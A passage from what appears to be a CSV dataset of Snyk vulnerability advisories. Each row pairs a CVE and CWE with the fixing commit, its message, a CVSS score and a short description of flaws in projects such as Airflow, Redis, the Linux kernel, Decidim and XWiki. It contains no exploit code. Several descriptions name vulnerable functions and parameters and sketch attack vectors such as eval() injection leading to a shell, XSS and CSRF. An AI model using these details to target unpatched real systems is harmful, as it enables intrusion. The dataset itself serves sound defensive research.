(cherry picked from commit 645c3fdae7f0575004fa586bc3fb100b54bd2aef)",Unknown,5.9,medium,"Affected versions of this package are vulnerable to Denial of Service (DoS). JavaScript preprocessing, webhooks and global scripts can cause uncontrolled CPU, memory, and disk I/O utilization. Preprocessing/webhook/global script configuration and testing are only available to Administrative roles (Admin and Superadmin). Administrative privileges should be typically granted to users who need to perform tasks that require more control over the system. The security risk is limited because not all users have this level of access.",2023
CVE-2020-9757,CWE-74,Snyk,https://security.snyk.io/vuln/SNYK-PHP-NYSTUDIO107CRAFTSEOMATIC-5773328,13/07/2023,24/05/2022,https://github.com/nystudio107/craft-seomatic/commit/65ab659cb6c914c7ad671af1e417c0da2431f79b,Information Exposure,https://api.github.com/repos/nystudio107/craft-seomatic/commits/65ab659cb6c914c7ad671af1e417c0da2431f79b,Andrew Welch,andrew@keluli.local,craft-seomatic,65ab659cb6c914c7ad671af1e417c0da2431f79b,Version 3.3.0,Markdown,7.5,high,Affected versions of this package are vulnerable to Information Exposure via malformed data to the metacontainers controller. Exploiting this vulnerability might result in information exposure.,2023
CVE-2023-37415,CWE-20,Snyk,https://security.snyk.io/vuln/SNYK-PYTHON-APACHEAIRFLOWPROVIDERSAPACHEHIVE-5773327,13/07/2023,13/07/2023,https://github.com/apache/airflow/commit/1c1dbd872d5378856b4242961dcdf77c7f0dd712,Improper Input Validation,https://api.github.com/repos/apache/airflow/commits/1c1dbd872d5378856b4242961dcdf77c7f0dd712,Jarek Potiuk,jarek@potiuk.com,airflow,1c1dbd872d5378856b4242961dcdf77c7f0dd712,Add proxy_user template check (#32334),Python,8.6,high,"Affected versions of this package are vulnerable to Improper Input Validation via the proxy_user value, which allows injection of a semicolon.",2023
CVE-2023-36543,CWE-20,Snyk,https://security.snyk.io/vuln/SNYK-PYTHON-APACHEAIRFLOW-5773324,13/07/2023,12/07/2023,https://github.com/apache/airflow/commit/116e607ddcb32480e57c342f48226545ac6fc315,Improper Input Validation,https://api.github.com/repos/apache/airflow/commits/116e607ddcb32480e57c342f48226545ac6fc315,Pierre Jeambrun,pierrejbrun@gmail.com,airflow,116e607ddcb32480e57c342f48226545ac6fc315,Use re2 for matching untrusted regex (#32060),Python,6.5,medium,"apache-airflow is a platform to programmatically author, schedule, and monitor workflows.
Affected versions of this package are vulnerable to Improper Input Validation which allows an authenticated user to use crafted input to make the current request hang.",2023
CVE-2023-3635,CWE-400,Snyk,https://security.snyk.io/vuln/SNYK-JAVA-COMSQUAREUPOKIO-5773320,13/07/2023,13/07/2023,https://github.com/square/okio/commit/81bce1a30af244550b0324597720e4799281da7b,Denial of Service (DoS),https://api.github.com/repos/square/okio/commits/81bce1a30af244550b0324597720e4799281da7b,Jesse Wilson,jwilson@squareup.com,okio,81bce1a30af244550b0324597720e4799281da7b,"Fix a bug where xlen larger than 0x7fff was rejected (#1280)

We treated this short value as unsigned and it should have been
treated as signed.",Kotlin,5.9,medium,"Affected versions of this package are vulnerable to Denial of Service (DoS) due to improper exception handling by the GzipSource class when parsing a malformed gzip buffer.
This vulnerability can be exploited on the Okio client when handling a crafted GZIP archive.",2023
CVE-2023-35908,CWE-863,Snyk,https://security.snyk.io/vuln/SNYK-PYTHON-APACHEAIRFLOW-5773323,13/07/2023,12/07/2023,https://github.com/apache/airflow/commit/ac65b82eeeeaa670e09a83c7da65cbac7e89f8db,Incorrect Authorization,https://api.github.com/repos/apache/airflow/commits/ac65b82eeeeaa670e09a83c7da65cbac7e89f8db,Niko Oliveira,onikolas@amazon.com,airflow,ac65b82eeeeaa670e09a83c7da65cbac7e89f8db,"Check for DAG ID in query param from url as well as kwargs (#32014)

Previously the dag id was only being checked in request args and form
but not kwargs, so it was possible for the id when passed as kwargs
to be None. This can allow auth for a user who does not have the
permissions to view a particular DAG.",Python,4.3,medium,"apache-airflow is a platform to programmatically author, schedule, and monitor workflows.
Affected versions of this package are vulnerable to Incorrect Authorization due to improper validation of the dag_id parameter, which allows unauthorized read access to a DAG through the URL.",2023
CVE-2023-36824,CWE-120,Snyk,https://security.snyk.io/vuln/SNYK-UNMANAGED-REDISREDIS-5772322,12/07/2023,10/07/2023,https://github.com/redis/redis/commit/bd1dac0c6e9b76d0e6439bc74ee83552edcd0d79,Buffer Overflow,https://api.github.com/repos/redis/redis/commits/bd1dac0c6e9b76d0e6439bc74ee83552edcd0d79,Lior Lahav,118261070+llahav-amzn@users.noreply.github.com,redis,bd1dac0c6e9b76d0e6439bc74ee83552edcd0d79,"Fix possible crash in command getkeys  (#12380)

When getKeysUsingKeySpecs processes a command with more than one key-spec,
and called with a total of more than 256 keys, it'll call getKeysPrepareResult again,
but since numkeys isn't updated, getKeysPrepareResult will not bother to copy key
names from the old result (leaving these slots uninitialized). Furthermore, it did not
consider the keys it already found when allocating more space.

Co-authored-by: Oran Agra <oran@redislabs.com>
(cherry picked from commit b7559d9f3b5e6ebb3fe3ad4570e3313ccaffa89e)",C/C++,7.0,high,"Affected versions of this package are vulnerable to Buffer Overflow. Extracting key names from a command and a list of arguments may, in some cases, trigger a heap overflow and result in reading random heap memory, heap corruption and potentially remote code execution. Specifically: using COMMAND GETKEYS* and validation of key names in ACL rules.",2023
CVE-2022-24834,CWE-680,Snyk,https://security.snyk.io/vuln/SNYK-UNMANAGED-REDISREDIS-5772323,12/07/2023,10/07/2023,https://github.com/redis/redis/commit/f6a7c9f9ec9354702cc3143310a24bf3d1507b03,Buffer Overflow,https://api.github.com/repos/redis/redis/commits/f6a7c9f9ec9354702cc3143310a24bf3d1507b03,Oran Agra,oran@redislabs.com,redis,f6a7c9f9ec9354702cc3143310a24bf3d1507b03,"Lua cjson and cmsgpack integer overflow issues (CVE-2022-24834)

* Fix integer overflows due to using wrong integer size.
* Add assertions / panic when overflow still happens.
* Deletion of dead code to avoid need to maintain it
* Some changes are not because of bugs, but rather paranoia.
* Improve cmsgpack and cjson test coverage.

Co-authored-by: Yossi Gottlieb <yossigo@gmail.com>",Unknown,7.0,high,Affected versions of this package are vulnerable to Buffer Overflow via the cjson and cmsgpack libraries when a specially crafted Lua script executing in Redis.,2023
CVE-2021-37939,CWE-319,Snyk,https://security.snyk.io/vuln/SNYK-JS-KIBANA-5772122,12/07/2023,25/05/2022,https://github.com/elastic/kibana/commit/85567f2bddd7d98030d213564ed8e177822fbdf7,Cleartext Transmission of Sensitive Information,https://api.github.com/repos/elastic/kibana/commits/85567f2bddd7d98030d213564ed8e177822fbdf7,Christos Nasikas,christos.nasikas@elastic.co,kibana,85567f2bddd7d98030d213564ed8e177822fbdf7,"[Connectors] Check connector's responses (#115797) (#116086)

Co-authored-by: Kibana Machine <42973632+kibanamachine@users.noreply.github.com>

Co-authored-by: Kibana Machine <42973632+kibanamachine@users.noreply.github.com>",TypeScript,4.1,medium,"kibana is an open source (Apache Licensed), browser-based analytics and search dashboard for Elasticsearch.
Affected versions of this package are vulnerable to Cleartext Transmission of Sensitive Information. It was discovered that Kibana’s JIRA connector & IBM Resilient connector could be used to return HTTP response data on internal hosts, which may be intentionally hidden from public view. Using this vulnerability, a malicious user with the ability to create connectors, could utilize these connectors to view limited HTTP response data on hosts accessible to the cluster.",2023
CVE-2023-3108,CWE-400,Snyk,https://security.snyk.io/vuln/SNYK-UNMANAGED-TORVALDSLINUX-5772132,12/07/2023,12/07/2023,https://github.com/torvalds/linux/commit/9399f0c51489ae8c16d6559b82a452fdc1895e91,Denial of Service (DoS),https://api.github.com/repos/torvalds/linux/commits/9399f0c51489ae8c16d6559b82a452fdc1895e91,Linus Torvalds,torvalds@linux-foundation.org,linux,9399f0c51489ae8c16d6559b82a452fdc1895e91,"crypto: fix af_alg_make_sg() conversion to iov_iter

Commit 1d10eb2f156f (""crypto: switch af_alg_make_sg() to iov_iter"")
broke af_alg_make_sg() and skcipher_recvmsg() in the process of moving
them to the iov_iter interfaces.  The 'npages' calculation in the formar
calculated the number of *bytes* in the pages, and in the latter case
the conversion didn't re-read the value of 'ctx->used' after waiting for
it to become non-zero.

This reverts to the original code for both these cases.

Cc: Al Viro <viro@zeniv.linux.org.uk>
Cc: David Miller <davem@davemloft.net>
Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>",C/C++,6.2,medium,Affected versions of this package are vulnerable to Denial of Service (DoS) in the subsequent get_user_pages_fast in the Linux kernel’s interface for symmetric key cipher algorithms in the skcipher_recvmsg of crypto/algif_skcipher.c function.,2023
CVE-2023-37767,CWE-400,Snyk,https://security.snyk.io/vuln/SNYK-UNMANAGED-GPACGPAC-5772130,12/07/2023,12/07/2023,https://github.com/gpac/gpac/commit/d414df635c773b21bbb3a9fbf17b101b1e8ea345,Denial of Service (DoS),https://api.github.com/repos/gpac/gpac/commits/d414df635c773b21bbb3a9fbf17b101b1e8ea345,jeanlf,jeanlf@gpac.io,gpac,d414df635c773b21bbb3a9fbf17b101b1e8ea345,fixed #2514,C/C++,5.3,medium,Affected versions of this package are vulnerable to Denial of Service (DoS) due to a segmentation violation in the BM_ParseIndexValueReplace function at /lib/libgpac.so.,2023
CVE-2023-37766,CWE-400,Snyk,https://security.snyk.io/vuln/SNYK-UNMANAGED-GPACGPAC-5772129,12/07/2023,12/07/2023,https://github.com/gpac/gpac/commit/a64c60ef0983be6db8ab1e4a663e0ce83ff7bf2c,Denial of Service (DoS),https://api.github.com/repos/gpac/gpac/commits/a64c60ef0983be6db8ab1e4a663e0ce83ff7bf2c,jeanlf,jeanlf@gpac.io,gpac,a64c60ef0983be6db8ab1e4a663e0ce83ff7bf2c,fixed #2516,C/C++,5.3,medium,Affected versions of this package are vulnerable to Denial of Service (DoS) due to a segmentation violation in the gf_isom_remove_user_data function at /lib/libgpac.so.,2023
CVE-2023-37765,CWE-400,Snyk,https://security.snyk.io/vuln/SNYK-UNMANAGED-GPACGPAC-5772128,12/07/2023,12/07/2023,https://github.com/gpac/gpac/commit/36e1b9900ff638576cb88636bbbe2116ed06dfdc,Denial of Service (DoS),https://api.github.com/repos/gpac/gpac/commits/36e1b9900ff638576cb88636bbbe2116ed06dfdc,jeanlf,jeanlf@gpac.io,gpac,36e1b9900ff638576cb88636bbbe2116ed06dfdc,fixed #2515,C/C++,5.3,medium,Affected versions of this package are vulnerable to Denial of Service (DoS) due to a segmentation violation in the gf_dump_vrml_sffield function at /lib/libgpac.so.,2023
CVE-2023-37174,CWE-400,Snyk,https://security.snyk.io/vuln/SNYK-UNMANAGED-GPACGPAC-5772127,12/07/2023,12/07/2023,https://github.com/gpac/gpac/commit/549ff4484246f2bc4d5fec6760332b43774db483,Denial of Service (DoS),https://api.github.com/repos/gpac/gpac/commits/549ff4484246f2bc4d5fec6760332b43774db483,jeanlf,jeanlf@gpac.io,gpac,549ff4484246f2bc4d5fec6760332b43774db483,fixed #2505,C/C++,5.3,medium,Affected versions of this package are vulnerable to Denial of Service (DoS) due to a segmentation violation in the dump_isom_scene function at /mp4box/filedump.c.,2023
CVE-2023-30226,CWE-400,Snyk,https://security.snyk.io/vuln/SNYK-UNMANAGED-RIZINORGRIZIN-5772126,12/07/2023,12/07/2023,https://github.com/rizinorg/rizin/commit/a6d89de0d44e776f9bccc3a168fdc79f604e14ed,Denial of Service (DoS),https://api.github.com/repos/rizinorg/rizin/commits/a6d89de0d44e776f9bccc3a168fdc79f604e14ed,ifyGecko,26214995+ifyGecko@users.noreply.github.com,rizin,a6d89de0d44e776f9bccc3a168fdc79f604e14ed,"ELF: added vn_next break condition (#3214)

if the dynamic section's verneednum mismatches the true number of entries then the for loop in get_gnu_verneed will continue to iterate on the last entry since vn_next will be 0 on the last entry. If verneednum is set to all 0xff's it will take a very long time to finish this loop naturally drastically hindering binary load time. The solution is simple, to check for when vn_next == 0 and break out of the loop since all entries have been iterated over regardless of what verneednum indicates.",C/C++,7.5,high,Affected versions of this package are vulnerable to Denial of Service (DoS) in the function get_gnu_verneed via a crafted elf file.,2023
CVE-2023-37280,CWE-79,Snyk,https://security.snyk.io/vuln/SNYK-PHP-PIMCOREADMINUICLASSICBUNDLE-5772123,12/07/2023,12/07/2023,https://github.com/pimcore/admin-ui-classic-bundle/commit/5fcd19bdc89a3fe4cb8ad8c356590e1e4740c743,Cross-site Scripting (XSS),https://api.github.com/repos/pimcore/admin-ui-classic-bundle/commits/5fcd19bdc89a3fe4cb8ad8c356590e1e4740c743,aryaantony92,97134765+aryaantony92@users.noreply.github.com,admin-ui-classic-bundle,5fcd19bdc89a3fe4cb8ad8c356590e1e4740c743,"Fix xss in admin login 2fa setup page (#147)

* Fix xss in admin login 2fa setup page

* Remove raw from the twig as the error message shouldn't have html",Unknown,5.0,medium,"Affected versions of this package are vulnerable to Cross-site Scripting (XSS) via the login 2fa setup page due to improper input sanitization.
An admin who has not set up two-factor authentication before is vulnerable to this attack without needing any privilege.",2023
CVE-2023-3106,CWE-476,Snyk,https://security.snyk.io/vuln/SNYK-UNMANAGED-TORVALDSLINUX-5772125,12/07/2023,12/07/2023,https://github.com/torvalds/linux/commit/1ba5bf993c6a3142e18e68ea6452b347f9cb5635,NULL Pointer Dereference,https://api.github.com/repos/torvalds/linux/commits/1ba5bf993c6a3142e18e68ea6452b347f9cb5635,Vegard Nossum,vegard.nossum@oracle.com,linux,1ba5bf993c6a3142e18e68ea6452b347f9cb5635,"xfrm: fix crash in XFRM_MSG_GETSA netlink handler

If we hit any of the error conditions inside xfrm_dump_sa(), then
xfrm_state_walk_init() never gets called. However, we still call
xfrm_state_walk_done() from xfrm_dump_sa_done(), which will crash
because the state walk was never initialized properly.

We can fix this by setting cb->args[0] only after we've processed the
first element and checking this before calling xfrm_state_walk_done().

Fixes: d3623099d3 (""ipsec: add support of limited SA dump"")
Cc: Nicolas Dichtel <nicolas.dichtel@6wind.com>
Cc: Steffen Klassert <steffen.klassert@secunet.com>
Signed-off-by: Vegard Nossum <vegard.nossum@oracle.com>
Acked-by: Nicolas Dichtel <nicolas.dichtel@6wind.com>
Signed-off-by: Steffen Klassert <steffen.klassert@secunet.com>",C/C++,6.6,medium,"Affected versions of this package are vulnerable to NULL Pointer Dereference in netlink_dump. This issue can occur when the Netlink socket receives the message(sendmsg) for the XFRM_MSG_GETSA, XFRM_MSG_GETPOLICY type message, and the DUMP flag is set and can cause a denial of service or possibly another unspecified impact. Due to the nature of the flaw, privilege escalation cannot be fully ruled out, although it is unlikely.",2023
CVE-2023-34089,CWE-79,Snyk,https://security.snyk.io/vuln/SNYK-RUBY-DECIDIM-5772120,12/07/2023,12/07/2023,https://github.com/decidim/decidim/commit/104d0bca93735df83e406ef1245b9a0afbd5c09f,Cross-site Scripting (XSS),https://api.github.com/repos/decidim/decidim/commits/104d0bca93735df83e406ef1245b9a0afbd5c09f,Alexandru Emil Lupu,contact@alecslupu.ro,decidim,104d0bca93735df83e406ef1245b9a0afbd5c09f,"Add metrics, statistics and process type to the participatory process importer and serializer (#10770)

* Add metrics and statistics to the importer

* Update tests to check for stats and metrics

* Add process type in serializer

* Add process type in the serializer spec

* Import participatory process type

* Fix test

* Update importer and add related specs

* Fix conflict and add test

* Add compact_translation metho

* Fix test

Co-authored-by: Pauline Bessoles <52420208+paulinebessoles@users.noreply.github.com>",Ruby,8.1,high,Affected versions of this package are vulnerable to Cross-site Scripting (XSS) due to improper user-input sanitization in the processes filter. This allows a remote attacker to execute JavaScript code in the context of a currently logged-in user. An attacker could use this vulnerability to make other users endorse or support proposals they have no intention of supporting or endorsing.,2023
,CWE-352,Snyk,https://security.snyk.io/vuln/SNYK-JS-VENDURECORE-5772121,12/07/2023,12/07/2023,https://github.com/vendure-ecommerce/vendure/commit/4a10d6785a3bf792ddf84053cdf232c205b82c81,Cross-site Request Forgery (CSRF),https://api.github.com/repos/vendure-ecommerce/vendure/commits/4a10d6785a3bf792ddf84053cdf232c205b82c81,Michael Bromley,michael@michaelbromley.co.uk,vendure,4a10d6785a3bf792ddf84053cdf232c205b82c81,"fix(core): Use more secure default for cookie sameSite option

Relates to https://github.com/vendure-ecommerce/vendure/security/advisories/GHSA-h9wq-xcqx-mqxm.
The default used by the underlying `cookie-session` middleware is `false`, which is the least
secure setting. In modern browsers, this should be interpreted as `lax`, but this cannot be assumed
to be the case in 100% of situations. Therefore, we will now default to `lax` and if the user
needs a less restrictive policy, they can explicitly set it to `none`.",TypeScript,4.3,medium,"@vendure/core is an A modern, headless ecommerce framework
Affected versions of this package are vulnerable to Cross-site Request Forgery (CSRF) such that by default the Cookie settings are insecure, having the SameSite setting as false which results in not having one (originates from the cookie-session npm package’s default settings).",2023
CVE-2023-3106,CWE-476,Snyk,https://security.snyk.io/vuln/SNYK-UNMANAGED-TORVALDSLINUX-5772124,12/07/2023,12/07/2023,https://github.com/torvalds/linux/commit/1ba5bf993c6a3142e18e68ea6452b347f9cb5635,NULL Pointer Dereference,https://api.github.com/repos/torvalds/linux/commits/1ba5bf993c6a3142e18e68ea6452b347f9cb5635,Vegard Nossum,vegard.nossum@oracle.com,linux,1ba5bf993c6a3142e18e68ea6452b347f9cb5635,"xfrm: fix crash in XFRM_MSG_GETSA netlink handler

If we hit any of the error conditions inside xfrm_dump_sa(), then
xfrm_state_walk_init() never gets called. However, we still call
xfrm_state_walk_done() from xfrm_dump_sa_done(), which will crash
because the state walk was never initialized properly.

We can fix this by setting cb->args[0] only after we've processed the
first element and checking this before calling xfrm_state_walk_done().

Fixes: d3623099d3 (""ipsec: add support of limited SA dump"")
Cc: Nicolas Dichtel <nicolas.dichtel@6wind.com>
Cc: Steffen Klassert <steffen.klassert@secunet.com>
Signed-off-by: Vegard Nossum <vegard.nossum@oracle.com>
Acked-by: Nicolas Dichtel <nicolas.dichtel@6wind.com>
Signed-off-by: Steffen Klassert <steffen.klassert@secunet.com>",C/C++,6.6,medium,"Affected versions of this package are vulnerable to NULL Pointer Dereference in netlink_dump. This issue can occur when the Netlink socket receives the message(sendmsg) for the XFRM_MSG_GETSA, XFRM_MSG_GETPOLICY type message, and the DUMP flag is set and can cause a denial of service or possibly another unspecified impact. Due to the nature of the flaw, privilege escalation cannot be fully ruled out, although it is unlikely.",2023
CVE-2023-34089,CWE-79,Snyk,https://security.snyk.io/vuln/SNYK-RUBY-DECIDIMCORE-5772119,12/07/2023,12/07/2023,https://github.com/decidim/decidim/commit/104d0bca93735df83e406ef1245b9a0afbd5c09f,Cross-site Scripting (XSS),https://api.github.com/repos/decidim/decidim/commits/104d0bca93735df83e406ef1245b9a0afbd5c09f,Alexandru Emil Lupu,contact@alecslupu.ro,decidim,104d0bca93735df83e406ef1245b9a0afbd5c09f,"Add metrics, statistics and process type to the participatory process importer and serializer (#10770)

* Add metrics and statistics to the importer

* Update tests to check for stats and metrics

* Add process type in serializer

* Add process type in the serializer spec

* Import participatory process type

* Fix test

* Update importer and add related specs

* Fix conflict and add test

* Add compact_translation metho

* Fix test

Co-authored-by: Pauline Bessoles <52420208+paulinebessoles@users.noreply.github.com>",Ruby,8.1,high,Affected versions of this package are vulnerable to Cross-site Scripting (XSS) due to improper user-input sanitization in the processes filter. This allows a remote attacker to execute JavaScript code in the context of a currently logged-in user. An attacker could use this vulnerability to make other users endorse or support proposals they have no intention of supporting or endorsing.,2023
CVE-2023-36825,CWE-502,Snyk,https://security.snyk.io/vuln/SNYK-PHP-ORCHIDPLATFORM-5772118,12/07/2023,12/07/2023,https://github.com/orchidsoftware/platform/commit/b0951373bddd4ef6608f1a09549c713cc6d52c8d,Deserialization of Untrusted Data,https://api.github.com/repos/orchidsoftware/platform/commits/b0951373bddd4ef6608f1a09549c713cc6d52c8d,tabuna,bliz48rus@gmail.com,platform,b0951373bddd4ef6608f1a09549c713cc6d52c8d,Changed state transmission,PHP,9.6,critical,"orchid/platform is a Platform for back-office applications, admin panel or CMS your Laravel app.
Affected versions of this package are vulnerable to Deserialization of Untrusted Data via the _state query parameter. Exploiting this vulnerability can result in remote code execution.",2023
CVE-2023-34090,CWE-200,Snyk,https://security.snyk.io/vuln/SNYK-RUBY-DECIDIMMEETINGS-5772116,12/07/2023,12/07/2023,https://github.com/decidim/decidim/commit/0967b6bbb7100cfd8ec114d9da1e4296cfe457cd,Information Exposure,https://api.github.com/repos/decidim/decidim/commits/0967b6bbb7100cfd8ec114d9da1e4296cfe457cd,Alexandru Emil Lupu,contact@alecslupu.ro,decidim,0967b6bbb7100cfd8ec114d9da1e4296cfe457cd,"Backport 'Fix meetings calendar filtering' to v0.27 (#10772)

* Fix meetings calendar filtering

* Pass  to the calendar filtering instead of the request params

* Add specs for meetings calendar and meetings directory calendar controllers

* Fix Linting issues

---------

Co-authored-by: Antti Hukkanen <antti.hukkanen@mainiotech.fi>",Ruby,7.5,high,"Affected versions of this package are vulnerable to Information Exposure due to using an external library which, by default, allows filtering on all data attributes and associations. This allows an unauthenticated remote attacker to exfiltrate non-public data from the underlying database of a Decidim instance (e.g., exfiltrating data from the user table).",2023
CVE-2019-13117,CWE-908,Snyk,https://security.snyk.io/vuln/SNYK-UNMANAGED-GNOMELIBXSLT-5769727,11/07/2023,11/07/2023,https://github.com/GNOME/libxslt/commit/c5eb6cf3aba0af048596106ed839b4ae17ecbcb1,Use of Uninitialized Resource,https://api.github.com/repos/GNOME/libxslt/commits/c5eb6cf3aba0af048596106ed839b4ae17ecbcb1,Nick Wellnhofer,wellnhofer@aevum.de,libxslt,c5eb6cf3aba0af048596106ed839b4ae17ecbcb1,"Fix uninitialized read of xsl:number token

Found by OSS-Fuzz.",C/C++,5.3,medium,"Affected versions of this package are vulnerable to Use of Uninitialized Resource. In numbers.c in libxslt 1.1.33, an xsl:number with certain format strings could lead to a uninitialized read in xsltNumberFormatInsertNumbers. This could allow an attacker to discern whether a byte on the stack contains the characters A, a, I, i, or 0, or any other character.",2023
CVE-2023-32693,CWE-79,Snyk,https://security.snyk.io/vuln/SNYK-RUBY-DECIDIMCORE-5772114,12/07/2023,12/07/2023,https://github.com/decidim/decidim/commit/550e86e237f8a4bc48bf5a8f204336a77c8cad4c,Cross-site Scripting (XSS),https://api.github.com/repos/decidim/decidim/commits/550e86e237f8a4bc48bf5a8f204336a77c8cad4c,Alexandru Emil Lupu,contact@alecslupu.ro,decidim,550e86e237f8a4bc48bf5a8f204336a77c8cad4c,"Backport 'Improve the link handling' to v0.27 (#10735)

* Improve the link handling

* Improve further the link handling

* More iterations

* Another iteration

* Enforce http or https protocols

* Temporary commit

* Running linters

* Refactor the links controller

* Apply review recommendations

* Add handling for invalid url

* Further improve the controller",Ruby,8.1,high,Affected versions of this package are vulnerable to Cross-site Scripting (XSS) due to improper user-input sanitization in the external link redirections. This allows a remote attacker to execute JavaScript code in the context of a currently logged-in user. An attacker could use this vulnerability to make other users endorse or support proposals they have no intention of supporting or endorsing.,2023
CVE-2019-18197,CWE-908,Snyk,https://security.snyk.io/vuln/SNYK-UNMANAGED-GNOMELIBXSLT-5769726,11/07/2023,11/07/2023,https://github.com/GNOME/libxslt/commit/2232473733b7313d67de8836ea3b29eec6e8e285,Use of Uninitialized Resource,https://api.github.com/repos/GNOME/libxslt/commits/2232473733b7313d67de8836ea3b29eec6e8e285,Nick Wellnhofer,wellnhofer@aevum.de,libxslt,2232473733b7313d67de8836ea3b29eec6e8e285,"Fix dangling pointer in xsltCopyText

xsltCopyText didn't reset ctxt->lasttext in some cases which could
lead to various memory errors in relation with CDATA sections in input
documents.

Found by OSS-Fuzz.",C/C++,7.5,high,"Affected versions of this package are vulnerable to Use of Uninitialized Resource. In xsltCopyText in transform.c in libxslt 1.1.33, a pointer variable isn't reset under certain circumstances. If the relevant memory area happened to be freed and reused in a certain way, a bounds check could fail and memory outside a buffer could be written to, or uninitialized data could be disclosed.",2023
CVE-2023-34090,CWE-200,Snyk,https://security.snyk.io/vuln/SNYK-RUBY-DECIDIM-5772117,12/07/2023,12/07/2023,https://github.com/decidim/decidim/commit/0967b6bbb7100cfd8ec114d9da1e4296cfe457cd,Information Exposure,https://api.github.com/repos/decidim/decidim/commits/0967b6bbb7100cfd8ec114d9da1e4296cfe457cd,Alexandru Emil Lupu,contact@alecslupu.ro,decidim,0967b6bbb7100cfd8ec114d9da1e4296cfe457cd,"Backport 'Fix meetings calendar filtering' to v0.27 (#10772)

* Fix meetings calendar filtering

* Pass  to the calendar filtering instead of the request params

* Add specs for meetings calendar and meetings directory calendar controllers

* Fix Linting issues

---------

Co-authored-by: Antti Hukkanen <antti.hukkanen@mainiotech.fi>",Ruby,7.5,high,"Affected versions of this package are vulnerable to Information Exposure due to using an external library which, by default, allows filtering on all data attributes and associations. This allows an unauthenticated remote attacker to exfiltrate non-public data from the underlying database of a Decidim instance (e.g., exfiltrating data from the user table).",2023
CVE-2023-3620,CWE-79,Snyk,https://security.snyk.io/vuln/SNYK-JS-TARTEAUCITRONJS-5772112,12/07/2023,11/07/2023,https://github.com/amauric/tarteaucitron.js/commit/c4c2fcf2b2212ce968bdcae145bb74283c441e5f,Cross-site Scripting (XSS),https://api.github.com/repos/amauric/tarteaucitron.js/commits/c4c2fcf2b2212ce968bdcae145bb74283c441e5f,Amauri CHAMPEAUX,amauri@champeaux.fr,tarteaucitron.js,c4c2fcf2b2212ce968bdcae145bb74283c441e5f,Filter the attr to avoid possible XSS vulnerability Fix #1132,JavaScript,4.6,medium,"tarteaucitronjs is a package that provides compliance to the European cookie law.
Affected versions of this package are vulnerable to Cross-site Scripting (XSS) due to improper user-input sanitization, via width, theme, controls, img and other attributes",2023
CVE-2023-32693,CWE-79,Snyk,https://security.snyk.io/vuln/SNYK-RUBY-DECIDIM-5772113,12/07/2023,12/07/2023,https://github.com/decidim/decidim/commit/550e86e237f8a4bc48bf5a8f204336a77c8cad4c,Cross-site Scripting (XSS),https://api.github.com/repos/decidim/decidim/commits/550e86e237f8a4bc48bf5a8f204336a77c8cad4c,Alexandru Emil Lupu,contact@alecslupu.ro,decidim,550e86e237f8a4bc48bf5a8f204336a77c8cad4c,"Backport 'Improve the link handling' to v0.27 (#10735)

* Improve the link handling

* Improve further the link handling

* More iterations

* Another iteration

* Enforce http or https protocols

* Temporary commit

* Running linters

* Refactor the links controller

* Apply review recommendations

* Add handling for invalid url

* Further improve the controller",Ruby,8.1,high,Affected versions of this package are vulnerable to Cross-site Scripting (XSS) due to improper user-input sanitization in the external link redirections. This allows a remote attacker to execute JavaScript code in the context of a currently logged-in user. An attacker could use this vulnerability to make other users endorse or support proposals they have no intention of supporting or endorsing.,2023
CVE-2023-37659,CWE-94,Snyk,https://security.snyk.io/vuln/SNYK-PYTHON-XALPHA-5772115,12/07/2023,11/07/2023,https://github.com/refraction-ray/xalpha/commit/6dceaa159a1a319d750ade20a4595956876657b6,Remote Code Execution (RCE),https://api.github.com/repos/refraction-ray/xalpha/commits/6dceaa159a1a319d750ade20a4595956876657b6,refraction-ray,kcanamgal@foxmail.com,xalpha,6dceaa159a1a319d750ade20a4595956876657b6,fix issue 174 175,Python,9.8,critical,"xalpha is an all about fund investment
Affected versions of this package are vulnerable to Remote Code Execution (RCE) via the eval() function, due to improper user-input sanitization. An attacker could obtain server permissions by using functions such as os.system() to execute cmd and directly obtain the cmd shell.",2023
CVE-2023-1672,CWE-362,Snyk,https://security.snyk.io/vuln/SNYK-UNMANAGED-LATCHSETTANG-5769706,11/07/2023,11/07/2023,https://github.com/latchset/tang/commit/8dbbed10870378f1b2c3cf3df2ea7edca7617096,Race Condition,https://api.github.com/repos/latchset/tang/commits/8dbbed10870378f1b2c3cf3df2ea7edca7617096,Sergio Correia,scorreia@redhat.com,tang,8dbbed10870378f1b2c3cf3df2ea7edca7617096,"Fix race condition when creating/rotating keys (#123)

When we create/rotate keys using either the tangd-keygen and
tangd-rotate-keys helpers, there is a small window between the
keys being created and then the proper ownership permissions being
set. This also happens when there are no keys and tang creates a
pair of keys itself.

In certain situations, such as the keys directory having wide open
permissions, a user with local access could exploit this race
condition and read the keys before they are set to more restrictive
permissions.

To prevent this issue, we now set the default umask to 0337 before
creating the files, so that they are already created with restrictive
permissions; afterwards, we set the proper ownership as usual.

Issue reported by Brian McDermott of CENSUS labs.

Fixes CVE-2023-1672


Reviewed-by: Sergio Arroutbi <sarroutb@redhat.com>
Signed-off-by: Sergio Correia <scorreia@redhat.com>",C/C++,5.3,medium,Affected versions of this package are vulnerable to Race Condition in the Tang server functionality for key generation and key rotation. This flaw results in a small time window where Tang private keys become readable by other processes on the same host.,2023
CVE-2023-37277,CWE-352,Snyk,https://security.snyk.io/vuln/SNYK-JAVA-ORGXWIKIPLATFORM-5769705,11/07/2023,11/07/2023,https://github.com/xwiki/xwiki-platform/commit/4c175405faa0e62437df397811c7526dfc0fbae7,Cross-site Request Forgery (CSRF),https://api.github.com/repos/xwiki/xwiki-platform/commits/4c175405faa0e62437df397811c7526dfc0fbae7,Michael Hamann,michael.hamann@xwiki.com,xwiki-platform,4c175405faa0e62437df397811c7526dfc0fbae7,"XWIKI-20135: Require a CSRF token for some request types in the REST API

* Require a CSRF token in the XWiki-Form-Token header in content types
  allowed in simple requests.
* Add integration tests to check that the check is indeed working.
* Automatically add the CSRF token header in same-origin requests
  initiated from JavaScript.
* Add an integration test to check that the form token is correctly
  added and fetch requests are still working.

Co-authored-by: Marius Dumitru Florea <marius@xwiki.com>",Java,9.6,critical,"Affected versions of this package are vulnerable to Cross-site Request Forgery (CSRF). The REST API allows executing all actions via POST requests and accepts text/plain, multipart/form-data or application/www-form-urlencoded as content types which can be sent via regular HTML forms. With the interaction of a user with programming rights, this allows remote code execution through script macros and thus impacts the integrity, availability and confidentiality of the whole XWiki installation.
Note:
For regular cookie-based authentication, the vulnerability is mitigated by SameSite cookie restrictions but as of March 2023, these are not enabled by default in Firefox and Safari.",2023
